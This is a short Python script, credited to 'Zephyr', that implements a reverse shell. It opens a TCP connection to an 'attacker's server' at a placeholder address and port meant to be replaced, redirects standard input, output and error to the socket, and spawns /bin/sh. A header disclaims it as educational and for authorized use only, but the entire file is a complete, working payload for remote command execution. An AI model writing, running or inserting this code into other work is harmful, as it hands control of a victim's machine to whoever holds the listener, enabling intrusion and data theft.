import socket
import os
import pty

# Developed by Zephyr
# WARNING: This script is intended for educational purposes only. 
# NEVER USE THIS PAYLOAD FOR ILLEGAL ACTIVITIES. Unauthorized use 
# of this script can result in serious legal consequences. Use 
# responsibly and only in environments where you have explicit permission.

# Define the IP address and port of the attacker's server
server_ip = "127.0.0.1" # Replace with your IP address
server_port = 1234 # Replace with your port number

# Create a TCP socket using IPv4 and TCP protocol
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Connect the socket to the attacker's server
s.connect((server_ip, server_port))

# Redirect standard input, output, and error streams to the socket
os.dup2(s.fileno(), 0) # Redirect stdin to the socket
os.dup2(s.fileno(), 1) # Redirect stdout to the socket
os.dup2(s.fileno(), 2) # Redirect stderr to the socket

# Spawn a new shell process and connect it to the socket
pty.spawn("/bin/sh")

